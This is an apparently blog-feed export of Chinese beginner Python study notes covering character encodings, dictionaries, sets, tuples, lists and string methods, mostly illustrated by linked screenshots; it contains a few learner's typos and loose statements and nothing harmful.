        <content type="html"><![CDATA[<p>二极管  电子电路<br>0 1 &lt;&#x3D;&gt; 1010101010 &#x3D;&gt; 二进制的转化成十进制:99，88，77<br>摩斯码 …_ _ _ &#x3D;&gt; a<br>100000000 &lt;&#x3D;&gt; a<br>ASCII &#x3D;&gt; 编排了128个操作符，只需要7个0和1就够了，01111111 &#x3D;&gt;1 byte &#x3D;&gt; 8 bit<br>ANSI &#x3D;&gt; 一套标准 每个字符 16bit &#x3D;&gt; 2byte<br>00000000 01111111  2**16&#x3D;65536个编码<br>到了中国，gb2312编码   gbk编码(Windows默认就是这个)，gb18030编码<br>01000101 01111111 &#x3D;&gt; 中<br>到了台湾，big5编码<br>到了日本，JIS编码<br>01000101 01111111 &#x3D;&gt; ありがとうございます</p><p>Unicode:万国码 中文<br>早期Unicode没有意识到这个问题 UCS -2 2个字节<br>进行了扩充 UCS -4 4个字节 1mb<br>00000000 00000000 00000000 01111111 4mb</p><p>utf:是可变长度的Unicode，可以进行数据的传输和存储 -&gt;行书，楷书，隶书<br>utf-8: 最短的字节长度8<br>英文:8bit 1byte<br>欧洲文字:16bit 2byte<br>中文:24bit  3byte<br>utf-16:最短的字节长度16</p><p>总结:<br>1.ascii:8bit 1byte<br>2.gbk:16bit 2byte Windows默认<br>3.unicode:32bit 4byte(没法用，只是一个标准)<br>4.utf-8:     mac默认<br>     英文:8bit 1byte<br>     欧洲文字:16bit 2byte<br>     中文:24bit  3byte<br>gbk和utf-8不能直接进行转化<br>我军密码本 &#x3D;&gt;   文字  &#x3D;&gt;   敌军密码本<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702127587899-25f30927-e7d3-418d-9a06-14587d7a98f9.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字典</title>
      <link href="/2023/12/10/%E5%AD%97%E5%85%B8/"/>
      <url>/2023/12/10/%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>首先字典是以键值对的形式存储数据的<br>字典的表示形式：{key:value,key2:value,key3:value}<br>字典的查找：val&#x3D;dic[“key”],子典查找用起来只是把索引换成了key<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702114147270-4dae82d3-dacf-4f7a-b57b-1d60439e972f.png" alt="image.png"><br>字典的key必须是可哈希的数据类型：int，str，tuple，bool。不可哈希：list，dict，set集合<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702114909730-5fb540e3-11f5-4c17-8951-72c1e25b5cd2.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702115252005-6bff7086-6288-421f-8fe2-b6a9aa480a5a.png" alt="image.png"><br>字典的value可以是任意数据类型。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702115180547-21b2cdc7-c5a6-44ad-9a99-f8f158bc64dd.png" alt="image.png"></p><p>最后的笔记：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702115349775-2b51e6e2-a78e-4c35-a2ac-e28dc91dd1df.png" alt="image.png"></p><h2 id="字典的增删改查"><a href="#字典的增删改查" class="headerlink" title="字典的增删改查"></a>字典的增删改查</h2><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><p>直接dic[“key”]&#x3D;value就可以进行添加<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702116097872-7822580c-95a0-4a1e-b291-5583adda84e0.png" alt="image.png"><br>setdefault设置默认值，这里是设置时是由’,’隔开，如果以前有了tom了，此时setdefault就不起作用了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702116491176-691bdec2-c5f6-4a38-9494-ffe4c117556c.png" alt="image.png"><br>这是一个setdefault的例子。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702116691262-e4a8e582-2394-49d5-8733-d0d8fc63e9e8.png" alt="image.png"></p><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><p>字典里面不会出现同一个key值，如果出现了后面的value将会覆盖前面的值，也就是此时字典里面已经有jojo了，再次进行执行时就是修改操作了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702116014734-a1c63b72-048d-43f0-9915-ab4fa9b5d5f8.png" alt="image.png"></p><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><p>字典的删除用pop，根据key进行删除<br>del dic[key]也能删除，但是不太好<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702116856507-577f0180-34c7-4b72-8057-71a25da90205.png" alt="image.png"></p><h3 id="查"><a href="#查" class="headerlink" title="查"></a>查</h3><p>直接用dic[key]进行查询<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702117381325-86135cac-fcac-4992-a4ac-61a7382df774.png" alt="image.png"><br>也可以用dic.get(key)进行查询<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702117546773-624eafc6-1762-4c24-888a-8b4d3824b397.png" alt="image.png"><br>但是各自的缺点是key是否存在运行后的结果产生分歧<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702117967915-bba396e8-cd8c-4e5e-98a7-ef9f34e530ec.png" alt="image.png"><br>说一下None：单纯就是空</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702118074360-233af316-2e8e-4b64-86c0-ead3b9b024c7.png" alt="image.png"><br>举了一个简单的例子：让程序看起来更加舒服<br>一开始是程序会报错，看起来很不舒服：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702118990436-d9d15f17-b418-47f7-98db-a6102aadc63e.png" alt="image.png"><br>后面用了if语句进行修改程序之后程序就变得更加顺畅。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702118877751-be414cd8-ae52-452c-91ad-4f718cb6e150.png" alt="image.png"><br>如果是用第一种dic[key]，程序直接报错，对用户很不友好<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702119120895-0858e8c6-7a96-44e5-963c-865cc7bc7884.png" alt="image.png"></p><h2 id="字典的循环和嵌套"><a href="#字典的循环和嵌套" class="headerlink" title="字典的循环和嵌套"></a>字典的循环和嵌套</h2><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>直接用for循环，拿到key值：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702119790615-0fe3325c-7896-4b09-bb27-093e9ad815f3.png" alt="image.png"><br>直接加个dic[key]<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702119946034-4bc35ace-0681-4427-8023-f7bbe93f13b9.png" alt="image.png"><br>拿到所有的key值可以用dic.key()的方法<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702120610770-fdd80a16-b647-40e5-9a56-9a42c47e883e.png" alt="image.png"><br>如果想以列表的形式输出的话只需要加个list，为了验证还特别加了一个type去验证dic.key的数据类型<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702120791057-dde0538a-0ebe-419e-a0c7-31c1ea667065.png" alt="image.png"><br>拿出字典中的values<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702121194442-bda81cd6-703d-45d5-a14b-d0a466c5d5bb.png" alt="image.png"><br>将其放入一个列表中，原理与key值放入一个列表一样<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702121283497-5b8dd006-e620-4635-b1d5-9ec1ab35e6da.png" alt="image.png"><br>直接拿到字典中的key和value<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702121402012-894ed2c8-c2b2-4b86-8e48-39819dcde7eb.png" alt="image.png"><br>当直接用列表进行输出时发现有点复杂<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702121595081-995abbb0-c742-4fae-a1d2-3b41623900b9.png" alt="image.png"><br>以for循环进行遍历一遍，再将它拿出来进行编号就更容易理解。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702121778388-8e12c7ab-9e6a-48ef-8c89-d86a61107008.png" alt="image.png"><br>元组和列表都可以进行该操作，该操作称之为解构(解包)，但是如果拆开后的元素与等号前面的元素对不上就会报错。<br>解构：把一个元组或者列表的结构拆开，把拆开之后的元素分别赋值给等号前面的这两个变量<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702122088973-19df452e-e2b3-4fa0-a6d7-6cc6086050c2.png" alt="image.png"><br>此时将上述说到的解构用到程序中，三行就能解决，使程序更加精简但还不是最简洁的。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702122614601-928890eb-950b-4218-a2cf-c5a4c14c3226.png" alt="image.png"><br>最后直接两行解决，直接拿到字典中所有的key和value<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702122834707-15d4b51a-bb54-412b-8646-3fbad10c0ef0.png" alt="image.png"></p><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>这个有点麻烦，我就不写了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702123210062-444e9b25-3583-4661-8b89-5ed8a2c83e71.png" alt="image.png"><br>直接通过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=wangfeng[<span class="string">&quot;wife&quot;</span>][<span class="string">&quot;assistant&quot;</span>][<span class="string">&quot;name&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure><p>就能直接输出<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702123590014-2020a02c-3f19-4e11-935f-75d17c154bfe.png" alt="image.png"><br>如果需要给其中某一个孩子进行加一岁的操作就可以先拿出来之后塞回去，做个等式就可以了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702123703103-82a20e6b-de1f-42c0-982a-bdcd0abc2f5e.png" alt="image.png"></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>字典的循环删除<br>字典在你进行迭代和循环的时候改变了大小：dictionary changed size during iteration，出现如下结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702125919312-5257e421-45bd-4fdc-b171-7c2ca79abc36.png" alt="image.png"><br>但是如果重新创建一个新列表存放key值，就能够完成接下来的操作。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702126165696-80f5aaa6-d1a0-45e8-a2dc-11577925e5d1.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>set集合</title>
      <link href="/2023/12/10/set%E9%9B%86%E5%90%88/"/>
      <url>/2023/12/10/set%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>单纯的{}显示的类型是字典<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702107603241-4265750d-70d2-4102-aab8-fdc128757478.png" alt="image.png"><br>随机输入数字或者字符串出现的结果是随机的并不是所展现出来的输入什么，输出就是什么，也就是说<strong>set集合是无序的</strong>。</p><p>不可哈希的数据类型为列表，也就是说set集合里面不能放列表<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702107895508-8fa2051b-cc88-4236-a1d0-c8b3aa599841.png" alt="image.png"><br>不可哈希的简单介绍：在python里面对某些数据类型是要做一定处理的，存储的数据是根据能不能够哈希，也就是哈希值来进行存储的，<br>set集合要求存储的数据是能够进行哈希计算的。<br>不可哈希：python中的set集合需要对数据进行存储时，需要对数据进行哈希计算，根据计算出的哈希值来存储数据<br>可哈希的数据类型是不可变的数据类型。例如：纯数字1(int),字符串(str),元组(tuple),布尔值(bool)<br>不可哈希的数据类型是可变的数据类型：list,dict,set集合{1，2，3，}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set集合要求存储的数据是能够进行哈希计算的。</span><br><span class="line">不可哈希：python中的set集合需要对数据进行存储时，需要对数据进行哈希计算，根据计算出的哈希值来存储数据</span><br><span class="line">可哈希的数据类型是不可变的数据类型。例如：纯数字1(int),字符串(str),元组(tuple),布尔值(bool)</span><br><span class="line">不可哈希的数据类型是可变数据类型：list,dict,set集合&#123;1，2，3，&#125;</span><br></pre></td></tr></table></figure><p>这也就是说set集合里面不能继续加set集合，会报错</p><p>空的set集合这样创建：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702109344010-d2b94b4f-e0ee-4176-a344-4052f0f01be8.png" alt="image.png"><br>进行添加数据直接用add()就可以了。</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702109482229-92fc47bb-a5da-4bd0-9167-e2b8651002f4.png" alt="image.png"><br>set集合既没有索引也没有切片。<br>由于set集合是无序的，所以测试的时候无法进行验证。pop删除的是最后一个元素<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702110254856-958038c7-c617-4a45-84f5-ba46a426c4e8.png" alt="image.png"><br>所以pop删除用的不多，用的多的是remove<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702110402762-147fe607-ce06-4b24-8b23-122dcd0e8ed8.png" alt="image.png"><br>想要修改就得先删除后添加<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702110629665-f68496df-7598-4c55-beed-6e79489871d2.png" alt="image.png"><br>set集合查找只能通过循环：for循环<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702110873974-4ec0a498-9bd3-4a74-89a8-3ca098462a30.png" alt="image.png"><br>最后的笔记：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set集合</span><br><span class="line">不可哈希：python中的set集合需要对数据进行存储时，需要对数据进行哈希计算，根据计算出的哈希值来存储数据</span><br><span class="line">set集合要求存储的数据是能够进行哈希计算的。</span><br><span class="line">可哈希的数据类型是不可变的数据类型。例如：纯数字1(int),字符串(str),元组(tuple),布尔值(bool)</span><br><span class="line">不可哈希的数据类型是可变的数据类型：list,dict,set集合&#123;1，2，3，&#125;</span><br><span class="line">set集合既没有索引也没有切片。</span><br><span class="line">由于set集合是无序的，所以测试的时候无法进行验证。删除的是最后一个元素</span><br><span class="line">删除：pop,remove</span><br><span class="line">想要修改就得先删除后添加</span><br><span class="line">set集合查找只能通过循环：for循环</span><br><span class="line">交集，并集，差集</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702110985449-f5c49bde-badd-4691-8798-359767399409.png" alt="image.png"><br>补充：<br>set集合的交集：intersection和&amp;，输出共有的一个<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702111284536-231ffdf1-3cbf-4db6-98ec-635f50bcb8f9.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702111465244-068a9daf-09ec-4223-8f99-6d59934cbf7b.png" alt="image.png"><br>set集合的并集：union和 |<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702111644470-582e8175-4e91-46de-9b8f-6e119cc534c3.png" alt="image.png"><br>set的差集：difference和 -<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702111822162-ae41f991-e7ae-4496-b415-f422b2a99430.png" alt="image.png"><br>重要的作用：去除重复也就是两个一模一样的元素不可能在同一个set集合里<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702112229480-a1eba18b-e8be-4043-9eef-1a7b50858576.png" alt="image.png"><br>利用这个特性，把列表里面重复的数据去掉，但是有一个问题就是去除之后出现的数据是无序的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702112561857-10350ec6-c3db-474a-81b7-7a67e063ffc7.png" alt="image.png"><br>切记：想把什么变成什么套括号就行<br>这里总结不是很好做就不搞了</p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元组</title>
      <link href="/2023/12/10/%E5%85%83%E7%BB%84/"/>
      <url>/2023/12/10/%E5%85%83%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>tuple 元组，特点：不可变的列表<br>元组和列表一样可以放很多东西，可以直接打印，也可以做切片：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702105021663-46b95c83-a10d-4e46-b438-45e22587af7d.png" alt="image.png"><br>同时注意’tuple’ object does not support item assignment翻译以下就是元组类型的对象不支持元素的重新定义<br>也就是说你重新去造一个t[0]，使它等于什么结果就是该元组没法改变，还会去报错。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702105295328-a6a4d121-e4ad-46b1-b054-bad943d4228a.png" alt="image.png"><br>如果元组里只有一个元素，此时能够正常输出，但是所展示的类型是字符串而不是元组<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702105729016-e6820b78-f619-462d-b34c-9cb1d8195831.png" alt="image.png"><br>如果想把它改为字符串，需要在元组的第一个元素后面加一个’,’此时元素的类型才会变成元组<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702105870878-eb79e3e0-4de0-4dd0-be00-6019013eb087.png" alt="image.png"><br>元组不可变，如果元组里面套了一个列表，由于列表是可变的，但是此时发现嘀嘀嘀已经加入进去，不是说了元组不能变吗？但是为什么又能加进去东西呢？注意：元组里面说的不可变指的是它()里面的那层地址不可变，也就是元组里面的列表是不能换成其他列表的，但是列表里面的内容是可以改变的。<br>增删改不存在，查询的话就用索引和切片就行了，for循环也可以。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702106499340-17dc436e-15f5-4eb3-863d-ac17b728ca4d.png" alt="image.png"><br>最后的总结：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702107137783-7938b5c8-2fa4-44fe-96e3-f1712e1448fc.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>列表的增删改查</title>
      <link href="/2023/12/10/%E5%88%97%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
      <url>/2023/12/10/%E5%88%97%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>像列表里面添加东西：append，在列表中的最后进行追加内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034024681-dfd54546-47f5-4638-b394-fd1a3ffcdb12.png" alt="image.png"><br>append，在列表中的最后进行追加内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034188204-90865dd5-3ddf-48fc-822c-dda35c34148a.png" alt="image.png"><br>insert进行插入<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034359140-3a694b8d-1213-43ad-91fa-3aac84091a7d.png" alt="image.png"><br>extend可以合并两个列表，批量添加<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034618490-2b7dca70-80b5-495e-bfa8-53ccc71e088c.png" alt="image.png"><br>pop删除，直接加索引就可以了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034822459-67e826d9-756e-414e-b5c8-afaf7dfae58d.png" alt="image.png"></p><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><p>pop能够查看返回值直接加个ret就可以了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702034921084-d28a95fa-89c6-438a-81e6-91da2d6b2aa3.png" alt="image.png"><br>remove直接删除列表中的元素，不会返回任何东西<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702035169267-0b23e167-c977-4176-a053-eeca59ccc6dd.png" alt="image.png"></p><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><p>直接用索引进行修改<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702035495235-19262ead-157a-4599-a94d-c19f92d07bbd.png" alt="image.png"></p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>直接用索引进行查询<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702035561556-9cf32765-0480-46ca-bc09-7ed0a0d26ae5.png" alt="image.png"><br>把所有姓刘的改成姓王的，这个小练习有点难度，单独分开看的明白，合在一起我就不明白了。这个地方复习的时候将会是重点(*)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702038041486-825b19e6-4b38-46fd-a552-95a5d1642121.png" alt="image.png"><br>最后的笔记：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702038655088-bda85f2d-a69b-4a9f-b70b-bd3ef83a737e.png" alt="image.png"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>列表是有顺序的，是按照你输入进去的顺序进行排列的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702048807880-f46bd82d-13ea-47f7-a10c-f536c4af35d5.png" alt="image.png"><br>对列表进行升序排序用到了sort()<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702048780606-98932267-44f3-482c-83b5-ddc0504a0dad.png" alt="image.png"><br>对列表进行降序排序，用到了sort(reverse&#x3D;Ture)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702048723331-f80e5db0-6432-469e-912e-9ab333a48df3.png" alt="image.png"><br>在多个列表中进行层层提取最后提取到单纯<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702049362609-12be4184-e3d1-4c19-98a7-b9a5eeb5b51b.png" alt="image.png"><br>将字符串crazy变成大写，字符串是不可变的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702049690193-3da5902b-c4b8-4c47-8f45-b172e37cff15.png" alt="image.png"><br>按照常理来说删掉姓刘是这样操作的，但是只删了一个<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702050763512-5513581e-f50d-4e06-8d18-f70ad2aec553.png" alt="image.png"><br>for循环进行遍历时按照排序一个个来，但是后面出现了问题，删除掉了一个需要后面的人来补，就导致在它后面的人没有进行循环也就是没有进行检测，导致让它后面的逃过一劫。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702050966915-38dc72e7-1817-44cc-a47a-199f6bc159e5.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702051108509-03d93ecd-0880-42ba-a919-f62741a8393e.png" alt="image.png"><br>这个地方删除姓刘的我也不懂为什么代码一样删除不了，后面才发现for写成了if，真是一个粗心的小伙子。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702053914653-0ec73aed-debe-4af5-a9d7-07dc8e5afb4e.png" alt="image.png"><br>最后的总结：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702054756100-10b14fa0-082f-42cb-b113-4f5ea00e7016.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>列表概念</title>
      <link href="/2023/12/10/%E5%88%97%E8%A1%A8%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/12/10/%E5%88%97%E8%A1%A8%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="一-概念"><a href="#一-概念" class="headerlink" title="一.概念"></a>一.概念</h2><p>定义：能装大量东西的东西叫做列表，什么都能放<br>在python中用[]表示一个列表，列表中的元素用，隔开<br>对list列表进行索引：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702032447929-4a121449-bf81-4acb-9099-7efe3e94d167.png" alt="image.png"><br>对list列表进行切片：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702032615550-5432063c-b003-4516-9416-7e616659e92b.png" alt="image.png"><br>倒着来一遍切片：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702032694044-4626542f-33b0-463c-91d1-2be9f6e0ff80.png" alt="image.png"><br>列表可以用for循环进行遍历<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702033230331-697fb743-1d3f-4312-a08a-02a69b8f06ad.png" alt="image.png"><br>可以用len查看列表的长度<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702033403109-cf882c4e-d875-407a-b5d7-92eac55a34d9.png" alt="image.png"><br>概念总结：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702033657184-bf70404c-def1-4480-8973-8de8f1baef87.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串的常规操作</title>
      <link href="/2023/12/10/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/12/10/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="一-字符串大小写的转换"><a href="#一-字符串大小写的转换" class="headerlink" title="一.字符串大小写的转换"></a>一.字符串大小写的转换</h2><p>字符串的操作一般不会对原字符串的操作产生影响，一般是返回一个新的字符串<br>大小写转换需要用到 capitalize这个函数，需要重新定义一个变量。否则就不会发生变化。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701788749616-579aabf0-c898-459a-9211-618ae14b334e.png" alt="image.png"><br>在中间输入汉字就会分为两段英文，title把英文段首字母变成大写<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701790193623-f01f7b90-4aa6-4c62-8cf0-f698f0111674.png" alt="image.png"><br>将其中的title换成capitalize发现只是首字母变成了大写。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701790502104-5f967008-8991-4984-9803-a0fda8337f6e.png" alt="image.png"><br>函数lower能够将英文大写全部转换为小写<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701790389428-340e41ab-cfb8-4ca0-b603-f7e0b91e17bc.png" alt="image.png"><br>函数upper能够将英文小写全部转换为大写<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701790806755-9b0cab93-86ee-4398-b3d3-f9734618cc7e.png" alt="image.png"><br>如何用upper忽略大小写来进行判断<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701792002619-4929444b-0056-4f54-8d3f-df6d926f68c1.png" alt="image.png"><br>为什么不用lower，因为在处理西欧的一些文字无法处理</p><h2 id="二-字符串的替换和切割"><a href="#二-字符串的替换和切割" class="headerlink" title="二.字符串的替换和切割"></a>二.字符串的替换和切割</h2><p>直接打印一串有空格的字符串，发现打印后仍然有空格<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701870100854-eca12f41-0a5e-4ae9-b52e-9155d3174a34.png" alt="image.png"><br>重新定义一个变量用到scrip函数消除两端空格，打印出来<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701870233344-a658ccd9-e568-44ae-b207-a16da06e65ae.png" alt="image.png"><br>输入正确，但是登陆失败，是因为输入时存在空格。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701871288617-a43fd823-a887-4ddd-9fd8-696297d01417.png" alt="image.png"><br>在user_name和password后面接上.strip()，就能够避免空格的问题。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701871528865-f1614acb-48cd-4e15-b313-274b9f4d0e87.png" alt="image.png"><br>在输入用户名时中间空格也可能会产生bug，导致登陆失败<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701871742468-bdbd9000-bb5d-496a-9401-012adafb7b7f.png" alt="image.png"><br>replace(old，new)，将old替换成new<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701872304304-0ddd7440-1217-4b89-9199-663330954b0f.png" alt="image.png"><br>通过replace()去掉所有的空格<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701872483212-43501db8-a16c-4fd8-992d-48238560adc1.png" alt="image.png"><br>split(用什么来切割)，用于字符串的切割，<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701872878281-b5ab1a97-b645-4d63-a7d2-3f5417d19b8e.png" alt="image.png"><br>中括号是列表，切割之后的结果会放在列表当中<br>切记：用什么切就会损失掉谁。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701873185136-83563e88-efe6-4a8c-9760-8eeeb369b79a.png" alt="image.png"><br>最后的笔记：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701873332394-9d530a0d-7059-4725-9297-90cbbe02a359.png" alt="image.png"></p><h2 id="三-字符串的查找和判断"><a href="#三-字符串的查找和判断" class="headerlink" title="三.字符串的查找和判断"></a>三.字符串的查找和判断</h2><p>查找：<br>find()，用find查找时只要返回了数字或者其他东西都算查找成功。<br>数字代表这个查找时字符串开始找到的长度，从0开始计算。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701873675063-f3c19a07-7e07-4aa8-8c1e-21d96102597d.png" alt="image.png"><br>find如果返回的是-1.就代表没有这个字符串<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701873858236-35871274-9023-4e8f-8dc5-2905f2d0ae27.png" alt="image.png"><br>index查找结果，数字代表这个查找时字符串开始找到的长度，从0开始计算。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701874716287-b47a1ebc-0809-47f7-8af4-2a53cd4f0445.png" alt="image.png"><br>find如果报错.就代表没有这个字符串<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701874786647-bd22ebf8-d6ac-4f97-b87e-fa64617ca03d.png" alt="image.png"><br>in可以做条件上的判断，也可用做for循环<br><img 